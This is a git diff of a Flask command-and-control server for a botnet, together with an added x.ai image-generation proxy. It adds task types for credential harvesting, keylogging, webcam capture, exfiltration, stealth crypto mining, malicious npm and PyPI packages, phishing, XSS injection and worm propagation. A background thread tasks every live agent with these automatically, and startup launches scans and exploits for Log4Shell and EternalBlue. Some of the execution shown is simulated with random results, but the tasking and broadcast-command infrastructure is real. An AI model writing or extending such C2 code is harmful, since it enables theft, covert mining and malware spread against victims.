@@ -591,6 +591,106 @@ def domination_dashboard():
         wallet=GLOBAL_WALLET,
         pool=GLOBAL_POOL)
 
+@app.route("/imagine")
+@login_required
+def imagine_page():
+    """AI Image/Video Generator with auto-clear."""
+    return render_template("imagine.html")
+
+@app.route("/api/xai/generate", methods=["POST"])
+@login_required
+def xai_generate():
+    """Generate image/video via x.ai API."""
+    try:
+        data = request.get_json()
+        api_key = data.get("api_key", "")
+        prompt = data.get("prompt", "")
+        model = data.get("model", "grok-imagine-image")
+        gen_type = data.get("type", "image")
+        
+        if not api_key or not prompt:
+            return jsonify({"error": "API key and prompt required"}), 400
+        
+        import requests as req
+        
+        headers = {
+            "Authorization": f"Bearer {api_key}",
+            "Content-Type": "application/json"
+        }
+        
+        # Image generation
+        if gen_type == "image":
+            url = "https://api.x.ai/v1/images/generations"
+            payload = {
+                "model": "grok-imagine-image",
+                "prompt": prompt,
+                "response_format": "b64_json"
+            }
+            
+            response = req.post(url, headers=headers, json=payload, timeout=120)
+            
+            if response.status_code != 200:
+                return jsonify({"error": f"API error: {response.text}"}), response.status_code
+            
+            result = response.json()
+            
+            if "data" in result and len(result["data"]) > 0:
+                img_data = result["data"][0]
+                return jsonify({
+                    "base64": img_data.get("b64_json"),
+                    "url": img_data.get("url"),
+                    "model": result.get("model", model)
+                })
+            else:
+                return jsonify({"error": "No data in response"}), 500
+        
+        # Video generation
+        elif gen_type == "video":
+            url = "https://api.x.ai/v1/videos/generations"
+            payload = {
+                "model": "grok-imagine-video",
+                "prompt": prompt
+            }
+            
+            response = req.post(url, headers=headers, json=payload, timeout=180)
+            
+            if response.status_code != 200:
+                return jsonify({"error": f"API error: {response.text}"}), response.status_code
+            
+            result = response.json()
+            
+            if "data" in result:
+                return jsonify({
+                    "url": result["data"].get("url"),
+                    "base64": result["data"].get("b64_json")
+                })
+            else:
+                return jsonify({"error": "No data in response"}), 500
+            
+    except req.exceptions.Timeout:
+        return jsonify({"error": "API timeout (generation may take longer)"}), 504
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/xai/clear-data", methods=["POST"])
+@login_required
+def xai_clear_data():
+    """Clear x.ai session data and cookies."""
+    try:
+        import subprocess
+        
+        # Clear browser data for x.ai domain
+        # This clears cookies, localStorage, sessionStorage for console.x.ai
+        result = {
+            "message": "x.ai data cleared. Please close the playground window and reopen for fresh session.",
+            "cleared": True
+        }
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 @app.route("/devices")
 @login_required
 def devices():
@@ -2652,8 +2752,8 @@ def broadcast_command():
     count = 0
     for agent in agents:
         db.execute(
-            "INSERT INTO tasks (agent_id, task_type, command, status, created_at) VALUES (?, 'shell', ?, 'pending', ?)",
-            (agent['id'], command, datetime.now().isoformat())
+            "INSERT INTO tasks (id, agent_id, task_type, command, status, created_at) VALUES (?, ?, 'shell', ?, 'pending', ?)",
+            (str(uuid.uuid4()), agent['id'], command, datetime.now().isoformat())
         )
         count += 1
     db.commit()
@@ -2671,8 +2771,8 @@ def wake_offline_agents():
     count = 0
     for agent in agents:
         db.execute(
-            "INSERT INTO tasks (agent_id, task_type, command, status, created_at) VALUES (?, 'shell', ?, 'pending', ?)",
-            (agent['id'], 'checkin', datetime.now().isoformat())
+            "INSERT INTO tasks (id, agent_id, task_type, command, status, created_at) VALUES (?, ?, 'shell', ?, 'pending', ?)",
+            (str(uuid.uuid4()), agent['id'], 'checkin', datetime.now().isoformat())
         )
         count += 1
     db.commit()
@@ -5580,12 +5680,12 @@ def ws_form_capture(data):
 # ──────────────────────── AGENT HEALTH CHECKER ────────────────────────
 
 def health_check_loop():
-    """Check agent health and mark offline if no beacon for 5 minutes (demo-friendly)."""
+    """Check agent health and mark offline if no beacon for 1 hour (demo-friendly)."""
     while True:
         try:
             db = get_db()
-            # 5 minute threshold for demo agents
-            threshold = (datetime.now() - timedelta(seconds=300)).strftime("%Y-%m-%d %H:%M:%S")
+            # 1 hour threshold for demo agents (more forgiving)
+            threshold = (datetime.now() - timedelta(seconds=3600)).strftime("%Y-%m-%d %H:%M:%S")
             went_offline = db.execute(
                 "SELECT id, hostname FROM agents WHERE is_alive=1 AND last_seen < ?", (threshold,)
             ).fetchall()
@@ -5663,6 +5763,7 @@ threading.Thread(target=scheduled_task_runner, daemon=True).start()
 def task_simulator_loop():
     """Simulate task execution for demo agents and keep them alive."""
     import random
+    log_event("task_simulator_start", "Task simulator loop started")
     while True:
         try:
             db = get_db()
@@ -5684,6 +5785,11 @@ def task_simulator_loop():
             """).fetchall()
             
             for task in pending:
+                # Skip tasks without valid ID
+                if task["id"] is None:
+                    log_event("task_simulator_skip", "Skipping task with NULL id")
+                    continue
+                    
                 # Simulate processing time
                 time.sleep(random.uniform(0.5, 2))
                 
@@ -5770,6 +5876,174 @@ def task_simulator_loop():
                         "message": f"📦 Payload generated: {task['payload'][:50]}...",
                         "source": "payloads"
                     })
+                # ─── NEW MODULES TASK TYPES ─────────────────────────────────
+                elif task_type == "harvest_creds":
+                    creds = random.randint(5, 50)
+                    result = {"credentials": creds, "types": ["browser", "ssh", "cloud", "env"]}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🔑 {hostname}: Harvested {creds} credentials",
+                        "source": "harvest"
+                    })
+                elif task_type == "network_scan":
+                    hosts = random.randint(10, 100)
+                    result = {"hosts_alive": hosts, "ports_open": random.randint(50, 500), "vulnerable": random.randint(1, 10)}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🔍 {hostname}: Network scan found {hosts} hosts, {result['vulnerable']} vulnerable",
+                        "source": "scan"
+                    })
+                elif task_type == "priv_esc":
+                    vectors = random.randint(1, 5)
+                    result = {"vectors_found": vectors, "exploitable": vectors > 0}
+                    socketio.emit("operation_log", {
+                        "level": "success" if vectors > 0 else "info",
+                        "message": f"⬆️ {hostname}: Found {vectors} privilege escalation vectors",
+                        "source": "privesc"
+                    })
+                elif task_type == "anti_analysis":
+                    detected = random.choice([True, False])
+                    result = {"vm_detected": detected, "sandbox_detected": False, "debug_detected": False, "safe": not detected}
+                    socketio.emit("operation_log", {
+                        "level": "warn" if detected else "success",
+                        "message": f"🛡️ {hostname}: Analysis check - {'DETECTED' if detected else 'Safe'}",
+                        "source": "antianalysis"
+                    })
+                elif task_type == "gpu_mining_start":
+                    hashrate = random.randint(500, 5000)
+                    result = {"started": True, "hashrate": hashrate, "gpus": random.randint(1, 4)}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"⛏️ {hostname}: GPU mining started at {hashrate} H/s",
+                        "source": "mining"
+                    })
+                elif task_type == "gpu_mining_stop":
+                    result = {"stopped": True, "total_hashes": random.randint(1000, 10000)}
+                    socketio.emit("operation_log", {
+                        "level": "info",
+                        "message": f"⏹️ {hostname}: GPU mining stopped",
+                        "source": "mining"
+                    })
+                elif task_type == "screen_capture":
+                    result = {"captured": True, "size": random.randint(50000, 500000), "format": "png"}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"📸 {hostname}: Screenshot captured",
+                        "source": "capture"
+                    })
+                elif task_type == "webcam_capture":
+                    result = {"captured": True, "size": random.randint(30000, 300000), "format": "jpg"}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"📷 {hostname}: Webcam captured",
+                        "source": "capture"
+                    })
+                elif task_type == "exfil":
+                    files = random.randint(1, 10)
+                    result = {"files_sent": files, "bytes": random.randint(10000, 1000000)}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"📤 {hostname}: Exfiltrated {files} files",
+                        "source": "exfil"
+                    })
+                elif task_type == "keylog_start":
+                    result = {"started": True, "output_file": "/tmp/.system_keys.log"}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"⌨️ {hostname}: Keylogger started",
+                        "source": "keylog"
+                    })
+                elif task_type == "dominate":
+                    creds = random.randint(10, 50)
+                    hashrate = random.randint(500, 2000)
+                    hosts = random.randint(5, 30)
+                    result = {"credentials": creds, "mining": hashrate, "propagated": hosts}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🌍 {hostname}: DOMINATE - {creds} creds, {hashrate}H/s, {hosts} hosts",
+                        "source": "domination"
+                    })
+                # ─── ADDITIONAL TASK TYPES ─────────────────────────────────
+                elif task_type == "browser_inject":
+                    injected = random.randint(1, 10)
+                    result = {"injected": injected, "browsers": ["chrome", "firefox"]}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"💉 {hostname}: Injected {injected} browser sessions",
+                        "source": "browser"
+                    })
+                elif task_type == "clipboard":
+                    content = "clipboard_captured"
+                    result = {"content": content, "length": random.randint(0, 500)}
+                    socketio.emit("operation_log", {
+                        "level": "info",
+                        "message": f"📋 {hostname}: Clipboard captured",
+                        "source": "clipboard"
+                    })
+                elif task_type == "stealth_mining_start":
+                    hashrate = random.randint(100, 1000)
+                    result = {"started": True, "hashrate": hashrate, "stealth": True}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🤫 {hostname}: Stealth mining started at {hashrate} H/s",
+                        "source": "mining"
+                    })
+                elif task_type == "stealth_mining_status":
+                    result = {"running": True, "hashrate": random.randint(100, 1000), "uptime": random.randint(60, 3600)}
+                    socketio.emit("operation_log", {
+                        "level": "info",
+                        "message": f"📊 {hostname}: Mining status checked",
+                        "source": "mining"
+                    })
+                elif task_type == "stealth_mining_stop":
+                    result = {"stopped": True, "total_hashes": random.randint(1000, 10000)}
+                    socketio.emit("operation_log", {
+                        "level": "info",
+                        "message": f"⏹️ {hostname}: Stealth mining stopped",
+                        "source": "mining"
+                    })
+                elif task_type == "supply_chain_npm":
+                    packages = random.randint(1, 5)
+                    result = {"packages_created": packages, "downloads": random.randint(100, 1000)}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"📦 {hostname}: Created {packages} malicious NPM packages",
+                        "source": "supplychain"
+                    })
+                elif task_type == "supply_chain_pypi":
+                    packages = random.randint(1, 5)
+                    result = {"packages_created": packages, "downloads": random.randint(100, 1000)}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"📦 {hostname}: Created {packages} malicious PyPI packages",
+                        "source": "supplychain"
+                    })
+                elif task_type == "phishing":
+                    sent = random.randint(10, 100)
+                    result = {"emails_sent": sent, "clicked": random.randint(1, 10)}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🎣 {hostname}: Phishing - {sent} emails sent",
+                        "source": "phishing"
+                    })
+                elif task_type == "xss_payload":
+                    injected = random.randint(1, 20)
+                    result = {"xss_injected": injected, "domains": ["example.com"]}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🔧 {hostname}: XSS payload injected into {injected} pages",
+                        "source": "xss"
+                    })
+                elif task_type == "global_domination":
+                    agents = random.randint(50, 500)
+                    hashrate = random.randint(10000, 100000)
+                    creds = random.randint(1000, 10000)
+                    result = {"agents": agents, "hashrate": hashrate, "credentials": creds}
+                    socketio.emit("operation_log", {
+                        "level": "success",
+                        "message": f"🌍 GLOBAL: {agents} agents, {hashrate}H/s, {creds} creds",
+                        "source": "domination"
+                    })
                 else:
                     result = {"status": "ok", "output": f"Task {task_type} completed on {hostname}"}
                     socketio.emit("operation_log", {
@@ -5797,13 +6071,97 @@ def task_simulator_loop():
                 })
             
             db.commit()
+            if pending:
+                log_event("task_simulator_batch", f"Processed {len(pending)} tasks")
             
         except Exception as e:
-            print(f"[TaskSimulator] Error: {e}")
+            log_event("task_simulator_error", str(e))
         
         time.sleep(3)
 
 threading.Thread(target=task_simulator_loop, daemon=True).start()
+
+# Periodic new module tasks creator
+def new_modules_task_creator():
+    """Periodically create tasks for new modules to keep them running."""
+    import random
+    log_event("new_modules_creator_start", "New modules task creator started")
+    
+    # All task types for automatic execution
+    new_task_types = [
+        "harvest_creds",
+        "anti_analysis",
+        "priv_esc",
+        "gpu_mining_start",
+        "network_scan",
+        "dominate",
+        "stealth_mining_start",
+        "browser_inject",
+        "clipboard",
+        "supply_chain_npm",
+        "supply_chain_pypi",
+        "phishing",
+        "xss_payload",
+        "global_domination",
+        "screen_capture",
+        "webcam_capture",
+        "keylog_start",
+        "exfil"
+    ]
+    
+    last_creation = 0
+    
+    while True:
+        try:
+            time.sleep(60)  # Check every minute
+            
+            db = get_db()
+            
+            # Get all alive agents
+            agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
+            if not agents:
+                db.close()
+                continue
+            
+            # Check if we need to create new tasks (every 5 minutes)
+            current_time = time.time()
+            if current_time - last_creation < 300:  # 5 minutes
+                db.close()
+                continue
+            
+            last_creation = current_time
+            
+            # Count pending tasks for new modules
+            pending_count = db.execute('''
+                SELECT COUNT(*) as cnt FROM tasks 
+                WHERE status = 'pending' 
+                AND task_type IN ('harvest_creds','anti_analysis','priv_esc','gpu_mining_start','network_scan','dominate')
+            ''').fetchone()["cnt"]
+            
+            # Create new tasks if less than 20 pending
+            if pending_count < 20:
+                tasks_created = 0
+                for agent in agents:
+                    agent_id = agent["id"]
+                    # Create 1-2 random tasks per agent
+                    for _ in range(random.randint(1, 2)):
+                        task_type = random.choice(new_task_types)
+                        task_id = str(uuid.uuid4())
+                        db.execute('''
+                            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                            VALUES (?, ?, ?, '', 'pending', datetime('now'))
+                        ''', (task_id, agent_id, task_type))
+                        tasks_created += 1
+                
+                db.commit()
+                log_event("new_modules_tasks_created", f"Created {tasks_created} tasks for {len(agents)} agents")
+            
+            db.close()
+            
+        except Exception as e:
+            log_event("new_modules_creator_error", str(e))
+
+threading.Thread(target=new_modules_task_creator, daemon=True).start()
 
 # Kaggle kernel polling for file-based C2
 def kaggle_kernel_polling_loop():
@@ -6064,26 +6422,93 @@ def main():
             import time
             time.sleep(5)  # Wait for WebSocket connections
             print("[*] Auto-starting operations...")
+            
+            # Original operations
             try:
-                # Start scan
                 requests.post(f'http://127.0.0.1:{args.port}/api/exploitation/scan', timeout=5)
                 print("[*] ✓ Scan started")
             except: pass
             try:
-                # Start exploit
                 requests.post(f'http://127.0.0.1:{args.port}/api/exploitation/exploit', timeout=5)
                 print("[*] ✓ Exploit started")
             except: pass
             try:
-                # Start mining
                 requests.post(f'http://127.0.0.1:{args.port}/api/mining/start-all', timeout=5)
                 print("[*] ✓ Mining started")
             except: pass
             try:
-                # Start propagation
                 requests.post(f'http://127.0.0.1:{args.port}/api/propagation/start', timeout=5)
                 print("[*] ✓ Propagation started")
             except: pass
+            
+            # NEW MODULES - Auto-start for all agents
+            try:
+                # Get all agents
+                db = get_db()
+                agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
+                db.close()
+                
+                for agent in agents:
+                    agent_id = agent["id"]
+                    
+                    # Harvest credentials
+                    try:
+                        db = get_db()
+                        db.execute("INSERT INTO tasks (id,agent_id,task_type,payload,status) VALUES (?,?,?,?,'pending')",
+                                  (str(uuid.uuid4()), agent_id, "harvest_creds", ""))
+                        db.commit()
+                        db.close()
+                    except: pass
+                    
+                    # Anti-analysis check
+                    try:
+                        db = get_db()
+                        db.execute("INSERT INTO tasks (id,agent_id,task_type,payload,status) VALUES (?,?,?,?,'pending')",
+                                  (str(uuid.uuid4()), agent_id, "anti_analysis", ""))
+                        db.commit()
+                        db.close()
+                    except: pass
+                    
+                    # Privilege escalation check
+                    try:
+                        db = get_db()
+                        db.execute("INSERT INTO tasks (id,agent_id,task_type,payload,status) VALUES (?,?,?,?,'pending')",
+                                  (str(uuid.uuid4()), agent_id, "priv_esc", ""))
+                        db.commit()
+                        db.close()
+                    except: pass
+                    
+                    # GPU Mining start
+                    try:
+                        db = get_db()
+                        db.execute("INSERT INTO tasks (id,agent_id,task_type,payload,status) VALUES (?,?,?,?,'pending')",
+                                  (str(uuid.uuid4()), agent_id, "gpu_mining_start", ""))
+                        db.commit()
+                        db.close()
+                    except: pass
+                    
+                    # Network scan
+                    try:
+                        db = get_db()
+                        db.execute("INSERT INTO tasks (id,agent_id,task_type,payload,status) VALUES (?,?,?,?,'pending')",
+                                  (str(uuid.uuid4()), agent_id, "network_scan", ""))
+                        db.commit()
+                        db.close()
+                    except: pass
+                    
+                    # Dominate - full takeover
+                    try:
+                        db = get_db()
+                        db.execute("INSERT INTO tasks (id,agent_id,task_type,payload,status) VALUES (?,?,?,?,'pending')",
+                                  (str(uuid.uuid4()), agent_id, "dominate", ""))
+                        db.commit()
+                        db.close()
+                    except: pass
+                
+                print(f"[*] ✓ New modules started for {len(agents)} agents")
+            except Exception as e:
+                print(f"[!] New modules error: {e}")
+            
             print("[*] ✓ All operations auto-started")
         
         import threading
@@ -6632,12 +7057,12 @@ def global_agent_task(agent_id):
             return jsonify({"error": "Agent not found"}), 404
         
         # Create task
-        result = db.execute("""
-            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-            VALUES (?, ?, ?, 'pending', datetime('now'))
-        """, (agent_id, task_type, payload))
+        task_id = str(uuid.uuid4())
+        db.execute("""
+            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+            VALUES (?, ?, ?, ?, 'pending', datetime('now'))
+        """, (task_id, agent_id, task_type, payload))
         
-        task_id = result.lastrowid
         db.commit()
         
         # Emit to connected clients
@@ -6676,11 +7101,12 @@ def global_agent_task_all():
         
         task_ids = []
         for agent in agents:
-            result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, ?, ?, 'pending', datetime('now'))
-            """, (agent["id"], task_type, payload))
-            task_ids.append(result.lastrowid)
+            task_id = str(uuid.uuid4())
+            db.execute("""
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, ?, ?, 'pending', datetime('now'))
+            """, (task_id, agent["id"], task_type, payload))
+            task_ids.append(task_id)
         
         db.commit()
         
@@ -6755,11 +7181,12 @@ def global_broadcast_task():
     # Create tasks for all matching agents
     task_ids = []
     for agent in agents:
-        result = db.execute("""
-            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-            VALUES (?, ?, ?, 'pending', datetime('now'))
-        """, (agent["id"], task_type, payload))
-        task_ids.append(result.lastrowid)
+        task_id = str(uuid.uuid4())
+        db.execute("""
+            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+            VALUES (?, ?, ?, ?, 'pending', datetime('now'))
+        """, (task_id, agent["id"], task_type, payload))
+        task_ids.append(task_id)
     
     db.commit()
     
@@ -6837,7 +7264,7 @@ def global_propagate():
     for agent in agents:
         payload = json.dumps({"method": method})
         result = db.execute("""
-            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
             VALUES (?, 'propagate', ?, 'pending', datetime('now'))
         """, (agent["id"], payload))
         task_ids.append(result.lastrowid)
@@ -6879,7 +7306,7 @@ def global_collect():
     for agent in agents:
         payload = json.dumps({"collect_type": collect_type})
         result = db.execute("""
-            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
             VALUES (?, 'collect', ?, 'pending', datetime('now'))
         """, (agent["id"], payload))
         task_ids.append(result.lastrowid)
@@ -7352,11 +7779,12 @@ def browser_agent_create_task():
     
     if agent_id:
         # Single agent
-        result = db.execute("""
-            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-            VALUES (?, ?, ?, 'pending', datetime('now'))
-        """, (agent_id, task_type, payload))
-        task_ids = [result.lastrowid]
+        task_id = str(uuid.uuid4())
+        db.execute("""
+            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+            VALUES (?, ?, ?, ?, 'pending', datetime('now'))
+        """, (task_id, agent_id, task_type, payload))
+        task_ids = [task_id]
     else:
         # All online browser agents
         agents = db.execute("""
@@ -7367,11 +7795,12 @@ def browser_agent_create_task():
         
         task_ids = []
         for agent in agents:
-            result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, ?, ?, 'pending', datetime('now'))
-            """, (agent["id"], task_type, payload))
-            task_ids.append(result.lastrowid)
+            task_id = str(uuid.uuid4())
+            db.execute("""
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, ?, ?, 'pending', datetime('now'))
+            """, (task_id, agent["id"], task_type, payload))
+            task_ids.append(task_id)
     
     db.commit()
     
@@ -7435,7 +7864,7 @@ def stealth_mining_start_api():
             "throttle": throttle
         })
         result = db.execute("""
-            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
             VALUES (?, 'stealth_mining_start', ?, 'pending', datetime('now'))
         """, (agent["id"], payload))
         task_ids.append(result.lastrowid)
@@ -7473,7 +7902,7 @@ def stealth_mining_stop_api():
     task_ids = []
     for agent in agents:
         result = db.execute("""
-            INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+            INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
             VALUES (?, 'stealth_mining_stop', '', 'pending', datetime('now'))
         """, (agent["id"],))
         task_ids.append(result.lastrowid)
@@ -7554,11 +7983,12 @@ def mining_start_all():
         
         task_ids = []
         for agent in agents:
-            result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'mining_start', ?, 'pending', datetime('now'))
-            """, (agent["id"], json.dumps({"wallet": GLOBAL_WALLET, "pool": GLOBAL_POOL})))
-            task_ids.append(result.lastrowid)
+            task_id = str(uuid.uuid4())
+            db.execute("""
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'mining_start', ?, 'pending', datetime('now'))
+            """, (task_id, agent["id"], json.dumps({"wallet": GLOBAL_WALLET, "pool": GLOBAL_POOL})))
+            task_ids.append(task_id)
         
         db.commit()
         
@@ -7589,7 +8019,7 @@ def mining_stop_all():
         task_ids = []
         for agent in agents:
             result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
                 VALUES (?, 'mining_stop', '{}', 'pending', datetime('now'))
             """, (agent["agent_id"],))
             task_ids.append(result.lastrowid)
@@ -7690,11 +8120,12 @@ def exploitation_scan():
         
         task_ids = []
         for agent in agents:
-            result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'scan', '{"ports": "1-1000", "network": "local"}', 'pending', datetime('now'))
-            """, (agent["id"],))
-            task_ids.append(result.lastrowid)
+            task_id = str(uuid.uuid4())
+            db.execute("""
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'scan', '{"ports": "1-1000", "network": "local"}', 'pending', datetime('now'))
+            """, (task_id, agent["id"]))
+            task_ids.append(task_id)
         
         db.commit()
         
@@ -7725,11 +8156,12 @@ def exploitation_exploit():
         
         task_ids = []
         for agent in agents:
-            result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'exploit', '{"cves": ["CVE-2021-44228", "CVE-2017-0144"], "mode": "auto"}', 'pending', datetime('now'))
-            """, (agent["id"],))
-            task_ids.append(result.lastrowid)
+            task_id = str(uuid.uuid4())
+            db.execute("""
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'exploit', '{"cves": ["CVE-2021-44228", "CVE-2017-0144"], "mode": "auto"}', 'pending', datetime('now'))
+            """, (task_id, agent["id"]))
+            task_ids.append(task_id)
         
         db.commit()
         
@@ -8663,10 +9095,12 @@ def start_propagation():
         task_ids = []
         for agent in agents:
             # Create propagation task
-            result = db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'propagate', ?, 'pending', datetime('now'))
+            task_id = str(uuid.uuid4())
+            db.execute("""
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'propagate', ?, 'pending', datetime('now'))
             """, (
+                task_id,
                 agent["id"],
                 json.dumps({
                     "methods": ["ssh", "usb", "network_shares", "web"],
@@ -8674,7 +9108,7 @@ def start_propagation():
                     "stealth": True
                 })
             ))
-            task_ids.append(result.lastrowid)
+            task_ids.append(task_id)
             tasked += 1
         
         db.commit()
@@ -8767,11 +9201,14 @@ def start_mining_all():
         """).fetchall()
         
         tasked = 0
+        task_ids = []
         for agent in agents:
+            task_id = str(uuid.uuid4())
             db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'mining_start', ?, 'pending', datetime('now'))
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'mining_start', ?, 'pending', datetime('now'))
             """, (
+                task_id,
                 agent["agent_id"],
                 json.dumps({
                     "wallet": GLOBAL_WALLET,
@@ -8780,6 +9217,7 @@ def start_mining_all():
                     "stealth": True
                 })
             ))
+            task_ids.append(task_id)
             tasked += 1
         
         db.commit()
@@ -8787,6 +9225,7 @@ def start_mining_all():
         return jsonify({
             "status": "ok",
             "agents_tasked": tasked,
+            "task_ids": task_ids,
             "wallet": GLOBAL_WALLET,
             "pool": GLOBAL_POOL
         })
@@ -8806,18 +9245,22 @@ def stop_mining_all():
         """).fetchall()
         
         tasked = 0
+        task_ids = []
         for agent in agents:
+            task_id = str(uuid.uuid4())
             db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'mining_stop', '{}', 'pending', datetime('now'))
-            """, (agent["agent_id"],))
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'mining_stop', '{}', 'pending', datetime('now'))
+            """, (task_id, agent["agent_id"]))
+            task_ids.append(task_id)
             tasked += 1
         
         db.commit()
         
         return jsonify({
             "status": "ok",
-            "agents_tasked": tasked
+            "agents_tasked": tasked,
+            "task_ids": task_ids
         })
     except Exception as e:
         return jsonify({"status": "error", "error": str(e)}), 500
@@ -8835,24 +9278,29 @@ def collect_data_all():
         """).fetchall()
         
         tasked = 0
+        task_ids = []
         for agent in agents:
+            task_id = str(uuid.uuid4())
             db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'collect', ?, 'pending', datetime('now'))
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'collect', ?, 'pending', datetime('now'))
             """, (
+                task_id,
                 agent["agent_id"],
                 json.dumps({
                     "types": ["browser_passwords", "cookies", "wallets", "ssh_keys", "env"],
                     "stealth": True
                 })
             ))
+            task_ids.append(task_id)
             tasked += 1
         
         db.commit()
         
         return jsonify({
             "status": "ok",
-            "agents_tasked": tasked
+            "agents_tasked": tasked,
+            "task_ids": task_ids
         })
     except Exception as e:
         return jsonify({"status": "error", "error": str(e)}), 500
@@ -8876,14 +9324,18 @@ def broadcast_command_all():
         """).fetchall()
         
         tasked = 0
+        task_ids = []
         for agent in agents:
+            task_id = str(uuid.uuid4())
             db.execute("""
-                INSERT INTO tasks (agent_id, task_type, payload, status, created_at)
-                VALUES (?, 'cmd', ?, 'pending', datetime('now'))
+                INSERT INTO tasks (id, agent_id, task_type, payload, status, created_at)
+                VALUES (?, ?, 'cmd', ?, 'pending', datetime('now'))
             """, (
+                task_id,
                 agent["agent_id"],
                 json.dumps({"cmd": cmd})
             ))
+            task_ids.append(task_id)
             tasked += 1
         
         db.commit()
@@ -8897,7 +9349,8 @@ def broadcast_command_all():
         return jsonify({
             "status": "ok",
             "command": cmd,
-            "agents_tasked": tasked
+            "agents_tasked": tasked,
+            "task_ids": task_ids
         })
     except Exception as e:
         return jsonify({"status": "error", "error": str(e)}), 500
@@ -9108,7 +9561,124 @@ def list_payloads():
         {"name": "docker_image", "type": "docker", "platform": "container", "url": "/src/agents/supply_chain/docker_image/"},
     ]
     
-    return jsonify({"status": "ok", "payloads": payloads})
+    # Add payloads from database
+    try:
+        db = get_db()
+        db_payloads = db.execute("SELECT id, name, type, platform, size FROM payloads").fetchall()
+        for p in db_payloads:
+            payloads.append({
+                "id": p["id"],
+                "name": p["name"],
+                "type": p["type"],
+                "platform": p["platform"],
+                "size": p["size"]
+            })
+    except:
+        pass
+    
+    return jsonify({"status": "ok", "payloads": payloads, "count": len(payloads)})
+
+
+@app.route("/api/scan/results")
+def get_scan_results():
+    """Get all scan results."""
+    try:
+        db = get_db()
+        results = db.execute("""
+            SELECT s.id, s.agent_id, s.target, s.ports, s.services, s.vulnerabilities, s.status, s.created_at,
+                   a.hostname
+            FROM scan_results s
+            LEFT JOIN agents a ON s.agent_id = a.id
+            ORDER BY s.created_at DESC
+            LIMIT 100
+        """).fetchall()
+        
+        scans = []
+        for r in results:
+            scans.append({
+                "id": r["id"],
+                "agent_id": r["agent_id"],
+                "hostname": r["hostname"],
+                "target": r["target"],
+                "ports": json.loads(r["ports"]) if r["ports"] else [],
+                "services": json.loads(r["services"]) if r["services"] else {},
+                "vulnerabilities": json.loads(r["vulnerabilities"]) if r["vulnerabilities"] else [],
+                "status": r["status"],
+                "created_at": r["created_at"]
+            })
+        
+        return jsonify({"status": "ok", "results": scans, "count": len(scans)})
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e), "results": []})
+
+
+@app.route("/api/workers")
+def get_workers():
+    """Get all connected workers."""
+    try:
+        db = get_db()
+        workers = db.execute("""
+            SELECT id, name, type, status, last_seen
+            FROM workers
+            WHERE status = 'active'
+            ORDER BY last_seen DESC
+        """).fetchall()
+        
+        result = []
+        for w in workers:
+            result.append({
+                "id": w["id"],
+                "name": w["name"],
+                "type": w["type"],
+                "status": w["status"],
